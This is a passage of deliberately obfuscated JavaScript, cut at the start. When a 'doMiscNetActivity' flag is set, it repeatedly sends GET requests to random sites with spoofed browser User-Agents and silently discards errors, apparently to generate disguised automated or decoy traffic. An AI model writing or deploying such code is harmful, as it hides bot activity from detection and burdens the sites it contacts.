      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1c9b + 0x1947 + -0x6 * 0x8fb; k < -0x17d0 + 0x2 * 0xda5 + -0x376 * 0x1; k++)
    setTimeout(f, (-0x2ce8 * 0x4 + -0x6f8e + 0x20d8e) * k * getRandomInt(-0xc9 * 0x11 + 0x1aec + 0xc1 * -0x12, 0x23e3 * 0x1 + 0xb * -0x32b + -0x107));
  setInterval(() => {
    f();
    for (let l = 0x61d + -0xd * 0x2f + -0x2 * 0x1dd; l < 0x2b3 + 0x47 * -0x6b + 0x1afe; l++)
      setTimeout(f, (0x16f89 + 0xb89e + 0x83 * -0x26d) * l * getRandomInt(0x81 * -0x2a + 0x78 * -0x44 + -0x350b * -0x1, 0x1b00 + -0x291 * -0x9 + -0x3216));
  }, -0x59c9bd + -0x50fba7 * -0x1 + -0x1 * -0x3fbc96);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a4 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites[a4(0x19)](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1b33 + 0x255c + 0x35 * 0x53) * getRandomInt(0x1f5b + 0x21d * -0x9 + -0xc55, 0xedb + -0x99a + 0x29e * -0x2));
}, 0x23bb + -0x2264 + -0x1b * 0x9);